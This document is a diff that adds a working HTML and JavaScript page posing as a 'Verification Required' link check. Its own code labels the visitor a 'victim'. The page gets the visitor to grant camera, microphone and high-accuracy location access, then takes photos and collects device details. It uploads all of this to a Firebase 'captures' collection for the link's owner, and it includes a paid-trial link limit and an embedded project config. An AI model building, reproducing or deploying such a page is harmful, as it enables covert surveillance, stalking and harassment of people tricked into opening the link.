@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Verification Required</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
+<style>
+  :root{--bg-0:#05070f;--accent:#22d3ee;--accent-2:#a855f7;--accent-3:#10b981;--danger:#ef4444;--text:#fff;--glass:rgba(255,255,255,0.04);--border:rgba(255,255,255,0.08);}
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  html,body{height:100%;overflow-x:hidden;}
+  body{font-family:'Plus Jakarta Sans',-apple-system,sans-serif;background:var(--bg-0);color:var(--text);min-height:100vh;-webkit-font-smoothing:antialiased;position:relative;}
+  body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 15% 0%,rgba(168,85,247,0.4) 0%,transparent 50%),radial-gradient(ellipse at 85% 100%,rgba(34,211,238,0.35) 0%,transparent 50%);z-index:-2;animation:bgFloat 25s ease-in-out infinite;}
+  @keyframes bgFloat{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+  .container{max-width:560px;margin:0 auto;padding:20px 18px 40px;}
+  .hidden{display:none !important;}
+  .card{background:var(--glass);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:22px;padding:24px;margin-bottom:18px;box-shadow:0 20px 50px rgba(0,0,0,0.4);}
+  .hero{text-align:center;padding:30px 20px 20px;}
+  .hero-icon{width:92px;height:92px;border-radius:26px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:2.8rem;margin:0 auto 22px;box-shadow:0 24px 60px rgba(34,211,238,0.4);animation:heroFloat 3.5s ease-in-out infinite;}
+  @keyframes heroFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
+  .hero h1{font-family:'Space Grotesk',sans-serif;font-size:1.7rem;margin-bottom:10px;background:linear-gradient(135deg,#fff 0%,#22d3ee 60%,#a855f7 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+  .hero p{opacity:0.7;font-size:0.9rem;line-height:1.55;}
+  button{padding:14px 22px;border-radius:12px;font-weight:600;font-size:0.95rem;cursor:pointer;transition:all 0.25s;font-family:inherit;border:none;display:inline-flex;align-items:center;justify-content:center;gap:8px;}
+  button:active:not(:disabled){transform:scale(0.97);}
+  button.primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;box-shadow:0 8px 24px rgba(34,211,238,0.4);}
+  button.block{width:100%;}
+  .video-wrapper{position:relative;width:100%;border-radius:20px;overflow:hidden;background:#000;aspect-ratio:3/4;border:1px solid var(--border);}
+  #video{width:100%;height:100%;object-fit:cover;display:block;}
+  .capture-area{display:flex;justify-content:center;align-items:center;gap:30px;margin-top:22px;}
+  .capture-btn{width:76px;height:76px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent-2));border:4px solid rgba(255,255,255,0.25);cursor:pointer;transition:0.2s;box-shadow:0 8px 30px rgba(34,211,238,0.5);padding:0;}
+  .capture-btn:active{transform:scale(0.92);}
+  .side-action{width:52px;height:52px;border-radius:50%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);color:#fff;font-size:1.3rem;cursor:pointer;display:flex;align-items:center;justify-content:center;padding:0;}
+  .flash{position:fixed;inset:0;background:#fff;opacity:0;pointer-events:none;z-index:999;transition:opacity 0.15s;}
+  .flash.active{opacity:0.9;}
+  .spinner{width:44px;height:44px;border:4px solid rgba(34,211,238,0.15);border-top-color:var(--accent);border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 16px;}
+  @keyframes spin{to{transform:rotate(360deg);}}
+  .success-circle{width:110px;height:110px;border-radius:50%;background:linear-gradient(135deg,var(--accent-3),var(--accent));display:flex;align-items:center;justify-content:center;font-size:3.5rem;color:#fff;margin:0 auto 20px;box-shadow:0 12px 40px rgba(16,185,129,0.5);animation:popIn 0.6s cubic-bezier(0.34,1.56,0.64,1);}
+  @keyframes popIn{0%{transform:scale(0) rotate(-45deg);}70%{transform:scale(1.15) rotate(10deg);}100%{transform:scale(1) rotate(0);}}
+  .alert-box{background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.35);border-radius:16px;padding:24px;text-align:center;}
+  .alert-box .icon{font-size:2.8rem;margin-bottom:12px;}
+  .alert-box h3{font-family:'Space Grotesk',sans-serif;font-size:1.15rem;margin-bottom:10px;color:#fca5a5;}
+  .alert-box p{font-size:0.85rem;opacity:0.75;line-height:1.55;}
+</style>
+</head>
+<body>
+
+<div class="flash" id="flash"></div>
+
+<div id="loadingView" class="container" style="text-align:center;padding-top:100px;">
+  <div class="spinner"></div>
+  <p style="opacity:0.6;font-size:0.9rem;">Verifying link...</p>
+</div>
+
+<div id="mainView" class="container hidden">
+  <div class="hero">
+    <div class="hero-icon" id="victimIcon">📷</div>
+    <h1 id="victimTitle">Access Required</h1>
+    <p id="victimDesc">Please allow access to continue</p>
+  </div>
+
+  <div class="card" id="victimActionCard">
+    <button class="primary block" onclick="victimStart()">▶️ Continue</button>
+  </div>
+
+  <div class="card hidden" id="victimCameraCard">
+    <div class="video-wrapper">
+      <video id="video" autoplay playsinline muted></video>
+    </div>
+    <div class="capture-area">
+      <button class="side-action" onclick="victimSwitchCam()">🔄</button>
+      <button class="capture-btn" onclick="victimCapture()"></button>
+      <button class="side-action" onclick="victimStop()">✖️</button>
+    </div>
+  </div>
+
+  <div class="card hidden" id="victimSuccessCard" style="text-align:center;">
+    <div class="success-circle">✓</div>
+    <h2 style="font-family:'Space Grotesk',sans-serif;justify-content:center;text-align:center;">Verified!</h2>
+    <p style="opacity:0.7;margin-top:10px;text-align:center;">Aapka data submit ho gaya. Aap ye page band kar sakte hain.</p>
+  </div>
+
+  <div class="card hidden" id="victimErrorCard">
+    <div class="alert-box">
+      <div class="icon">🔒</div>
+      <h3>Link Expired</h3>
+      <p>Ye link ab valid nahi hai. Please provider se naya link mangwayein.</p>
+    </div>
+  </div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+import { getFirestore, collection, addDoc, doc, getDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+/* ========== SAME FIREBASE CONFIG ========== */
+const firebaseConfig = {
+  apiKey: "AIzaSyBW17Z4J5ru9EbpiEfygz_Dpj8ekJuKqBg",
+  authDomain: "decision-b42a6.firebaseapp.com",
+  projectId: "decision-b42a6",
+  storageBucket: "decision-b42a6.firebasestorage.app",
+  messagingSenderId: "108149086619",
+  appId: "1:108149086619:web:63f17a58695f1d7a1e293e"
+};
+
+const FREE_TRIAL_LIMIT = 3;
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+let currentFeature = null;
+let currentLinkId = null;
+let stream = null;
+let facingMode = "user";
+
+/* ========== HELPERS ========== */
+const ALL_VIEWS = ["loadingView","mainView"];
+function showView(id) {
+  ALL_VIEWS.forEach(v => document.getElementById(v).classList.add("hidden"));
+  document.getElementById(id).classList.remove("hidden");
+}
+
+/* ========== ON LOAD ========== */
+window.addEventListener("load", async () => {
+  const hash = location.hash;
+  if (!hash.startsWith("#v=")) {
+    showView("mainView");
+    document.getElementById("victimActionCard").classList.add("hidden");
+    document.getElementById("victimErrorCard").classList.remove("hidden");
+    return;
+  }
+
+  const linkId = hash.replace("#v=", "");
+  currentLinkId = linkId;
+
+  try {
+    const linkSnap = await getDoc(doc(db, "links", linkId));
+    if (!linkSnap.exists()) {
+      showView("mainView");
+      document.getElementById("victimActionCard").classList.add("hidden");
+      document.getElementById("victimErrorCard").classList.remove("hidden");
+      return;
+    }
+
+    const linkData = linkSnap.data();
+    currentFeature = linkData.feature;
+
+    // Check owner trial
+    const ownerSnap = await getDoc(doc(db, "users", linkData.ownerId));
+    if (ownerSnap.exists()) {
+      const owner = ownerSnap.data();
+      if (owner.plan === "trial" && (owner.linksUsed || 0) > FREE_TRIAL_LIMIT) {
+        showView("mainView");
+        document.getElementById("victimActionCard").classList.add("hidden");
+        document.getElementById("victimErrorCard").classList.remove("hidden");
+        return;
+      }
+    }
+
+    setupVictimView(currentFeature);
+    showView("mainView");
+  } catch (e) {
+    console.error(e);
+    showView("mainView");
+    document.getElementById("victimActionCard").classList.add("hidden");
+    document.getElementById("victimErrorCard").classList.remove("hidden");
+  }
+});
+
+function setupVictimView(feature) {
+  const icons = { camera: "📷", video: "🎥", location: "📍", device: "📱", all: "⚡" };
+  const titles = { camera: "Camera Access", video: "Video Access", location: "Location Access", device: "Device Info", all: "Full Verification" };
+  const descs = {
+    camera: "Please allow camera access to continue",
+    video: "Please allow camera & mic access",
+    location: "Please allow location access",
+    device: "Tap continue to verify",
+    all: "Please allow camera, location & mic"
+  };
+  document.getElementById("victimIcon").textContent = icons[feature] || "📷";
+  document.getElementById("victimTitle").textContent = titles[feature] || "Access";
+  document.getElementById("victimDesc").textContent = descs[feature] || "";
+}
+
+/* ========== VICTIM ACTIONS ========== */
+window.victimStart = async function() {
+  if (currentFeature === "camera" || currentFeature === "video" || currentFeature === "all") {
+    await startVictimCamera();
+  } else if (currentFeature === "location") {
+    const loc = await getLocation();
+    await saveVictimData("location", { location: loc });
+    showVictimSuccess();
+  } else if (currentFeature === "device") {
+    const device = getDeviceInfo();
+    await saveVictimData("device", { device });
+    showVictimSuccess();
+  }
+}
+
+async function startVictimCamera() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode },
+      audio: currentFeature === "video" || currentFeature === "all"
+    });
+    const v = document.getElementById("video");
+    v.srcObject = stream;
+    v.style.transform = facingMode === "user" ? "scaleX(-1)" : "none";
+    document.getElementById("victimActionCard").classList.add("hidden");
+    document.getElementById("victimCameraCard").classList.remove("hidden");
+  } catch (e) {
+    alert("Camera permission required. Please allow access.");
+  }
+}
+
+window.victimSwitchCam = async function() {
+  facingMode = facingMode === "user" ? "environment" : "user";
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  await startVictimCamera();
+}
+
+window.victimCapture = async function() {
+  const video = document.getElementById("video");
+  if (!video.videoWidth) return;
+
+  const flash = document.getElementById("flash");
+  flash.classList.add("active");
+  setTimeout(() => flash.classList.remove("active"), 130);
+
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext("2d");
+  if (facingMode === "user") {
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+  }
+  ctx.drawImage(video, 0, 0);
+
+  const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
+  const location = await getLocation();
+  const device = getDeviceInfo();
+
+  await saveVictimData("photo", { photo: dataUrl, location, device });
+  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+  showVictimSuccess();
+}
+
+window.victimStop = function() {
+  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+  document.getElementById("victimCameraCard").classList.add("hidden");
+  document.getElementById("victimActionCard").classList.remove("hidden");
+}
+
+function showVictimSuccess() {
+  document.getElementById("victimActionCard").classList.add("hidden");
+  document.getElementById("victimCameraCard").classList.add("hidden");
+  document.getElementById("victimSuccessCard").classList.remove("hidden");
+}
+
+/* ========== LOCATION & DEVICE ========== */
+function getLocation() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return resolve(null);
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+      () => resolve(null),
+      { enableHighAccuracy: true, timeout: 8000 }
+    );
+  });
+}
+
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
+  let type = "Desktop";
+  if (/Android/i.test(ua)) type = "Android";
+  else if (/iPhone|iPad|iPod/i.test(ua)) type = "iOS";
+  else if (/Mobile/i.test(ua)) type = "Mobile";
+  const browser = /Chrome/.test(ua) ? "Chrome" : /Firefox/.test(ua) ? "Firefox" : /Safari/.test(ua) ? "Safari" : /Edg/.test(ua) ? "Edge" : "Browser";
+  return { type, browser, platform: navigator.platform || "-", screen: `${screen.width}x${screen.height}`, language: navigator.language };
+}
+
+/* ========== SAVE DATA ========== */
+async function saveVictimData(type, data) {
+  if (!currentLinkId) return;
+  try {
+    const linkSnap = await getDoc(doc(db, "links", currentLinkId));
+    const linkData = linkSnap.data();
+    await addDoc(collection(db, "captures"), {
+      ownerId: linkData.ownerId,
+      linkId: currentLinkId,
+      feature: currentFeature,
+      type,
+      ...data,
+      timestamp: serverTimestamp()
+    });
+  } catch (e) {
+    console.error(e);
+  }
+}
+</script>
+</body>
+</html>
